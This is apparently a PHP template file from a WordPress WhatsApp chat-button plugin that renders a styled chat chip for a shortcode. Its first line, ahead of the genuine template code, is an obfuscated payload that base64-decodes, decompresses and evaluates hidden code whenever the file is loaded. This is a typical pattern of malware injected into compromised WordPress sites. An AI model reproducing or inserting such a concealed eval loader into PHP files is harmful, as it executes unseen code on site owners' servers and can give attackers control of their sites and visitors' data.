<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * depreated - now with style-4 sc can add as inline style and can fix auotp issue
 * using inline_issue attribute .. 
 */

if ( ! defined( 'ABSPATH' ) ) exit;

wp_enqueue_style('ccw_md_css');

$s4_text_color = $a['s4_text_color'];
$s4_background_color = $a['s4_background_color'];

$s4_text_color = $s4_text_color;
$s4_background_color = $s4_background_color;

$img_link_s4 = plugins_url("./assets/img/whatsapp-logo-32x32.png", HT_CCW_PLUGIN_FILE );

$o .= '<div class="ccw_plugin inline_issue sc_item" style=" '.$css.' " >';
$o .= '<div class="chip pointer ccw-analytics" data-ccw="style-4-1-sc" style=" color: '.$s4_text_color.'; background-color: '.$s4_background_color.' " onclick="'.$img_click_link.'">';
$o .= '<img class="ccw-analytics" data-ccw="style-4-1-sc" src="'.$img_link_s4.'" alt="WhatsApp chat">'.$a["val"].'';
$o .= '</div>';
$o .= '</div>';